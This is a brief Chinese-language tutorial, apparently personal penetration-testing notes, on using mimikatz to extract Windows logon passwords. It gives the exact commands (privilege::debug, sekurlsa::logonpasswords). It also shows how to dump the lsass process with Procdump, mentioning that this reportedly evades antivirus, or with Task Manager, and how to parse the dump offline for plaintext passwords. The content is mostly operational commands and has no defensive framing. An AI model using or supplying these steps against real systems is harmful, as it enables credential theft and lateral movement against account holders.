# mimikatz

## 直接使用方法

下载地址：`https://github.com/gentilkiwi/mimikatz/releases`  
下载到windows机器中，运行该软件，输入如下图的两条命令即可完成密码抓取。  

1. 提升权限：privilege::debug
2. 抓取密码：sekurlsa::logonpasswords  
![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-1.png)

## 无法直接利用的情况

导出lsass进程离线读取密码。  

### 使用工具导出lsass文件

工具下载链接：这种方式导出lsass据说不会报毒  
`http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx`  
`https://github.com/1120362990/Paper/raw/master/tools/Procdump.zip`  

下载完成后运行如下命令即可导出 lsass.dmp 文件  
`Procdump.exe -accepteula -ma lsass.exe lsass.dmp`

### 在任务管理器中导出lsass文件

如下图点击即可导出lsass文件  
![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-2.png)

文件导出位置，导出后会显示  
![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-3.png)

在windows主机中运行如下命令，对导出的lsass文件进行分析即可得到明文密码  
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit  
![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-mimikatz-4.png)
